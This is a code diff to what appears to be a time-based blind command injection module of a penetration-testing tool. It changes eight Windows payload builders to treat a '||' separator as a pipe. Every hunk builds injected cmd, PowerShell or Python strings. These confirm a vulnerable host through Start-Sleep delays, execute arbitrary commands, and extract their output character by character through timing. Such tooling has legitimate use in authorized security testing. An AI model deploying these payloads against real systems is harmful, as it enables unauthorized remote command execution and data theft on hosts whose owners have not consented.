@@ -26,8 +26,9 @@ Time-based decision payload (check if host is vulnerable).
 """
 def decision(separator, TAG, output_length, timesec, http_request_method):
   if settings.TARGET_OS == "win":
-    if separator == "|" :
-      payload = (separator + 
+    if separator == "||" or separator == "|" :
+      pipe = "|"
+      payload = (pipe +
                  "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
                  "do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE + 
                  "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\""
@@ -96,8 +97,9 @@ __Warning__: The alternative shells are still experimental.
 def decision_alter_shell(separator, TAG, output_length, timesec, http_request_method):
   if settings.TARGET_OS == "win":
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\""
-    if separator == "|" :
-      payload = (separator + settings.SINGLE_WHITESPACE +  
+    if separator == "||" or separator == "|" :
+      pipe = "|"
+      payload = (pipe + settings.SINGLE_WHITESPACE +  
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE + 
@@ -177,8 +179,9 @@ Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
   if settings.TARGET_OS == "win":
-    if separator == "|" :
-      payload = (separator + settings.SINGLE_WHITESPACE + 
+    if separator == "||" or separator == "|" :
+      pipe = "|"
+      payload = (pipe + settings.SINGLE_WHITESPACE + 
                 "for /f \"tokens=*\" %i in ('cmd /c \"" +
                 cmd + 
                 "\"') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE + 
@@ -252,8 +255,9 @@ __Warning__: The alternative shells are still experimental.
 """
 def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method):
   if settings.TARGET_OS == "win":
-    if separator == "|" :
-      payload = (separator + settings.SINGLE_WHITESPACE + 
+    if separator == "||" or separator == "|" :
+      pipe = "|"
+      payload = (pipe + settings.SINGLE_WHITESPACE + 
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 cmd + 
                 "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
@@ -330,8 +334,9 @@ Get the execution output, of shell execution.
 """
 def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == "win":
-    if separator == "|" :
-      payload = (separator + settings.SINGLE_WHITESPACE + 
+    if separator == "||" or separator == "|" :
+      pipe = "|"
+      payload = (pipe + settings.SINGLE_WHITESPACE + 
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
                 cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +  
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec + 1) + "\""
@@ -415,8 +420,9 @@ __Warning__: The alternative shells are still experimental.
 def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == "win":
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print(ord(os.popen('" + cmd + "').read().strip()[" + str(num_of_chars-1) + ":" + str(num_of_chars) + "]))\""
-    if separator == "|" :
-      payload = (separator + settings.SINGLE_WHITESPACE +  
+    if separator == "||" or separator == "|" :
+      pipe = "|"
+      payload = (pipe + settings.SINGLE_WHITESPACE +  
                 "for /f \"tokens=*\" %i in ('cmd /c " + 
                 python_payload +
                 "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE + 
@@ -492,8 +498,9 @@ Get the execution output, of shell execution.
 """
 def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == "win":
-    if separator == "|" :
-      payload = (separator + settings.SINGLE_WHITESPACE + 
+    if separator == "||" or separator == "|" :
+      pipe = "|"
+      payload = (pipe + settings.SINGLE_WHITESPACE + 
                 "for /f \"tokens=*\" %i in ('cmd /c \"" +
                 cmd + 
                 "\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +  
@@ -559,8 +566,9 @@ __Warning__: The alternative shells are still experimental.
 """
 def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == "win":
-    if separator == "|" :
-      payload = (separator + settings.SINGLE_WHITESPACE + 
+    if separator == "||" or separator == "|" :
+      pipe = "|"
+      payload = (pipe + settings.SINGLE_WHITESPACE + 
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 cmd + 
                 "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
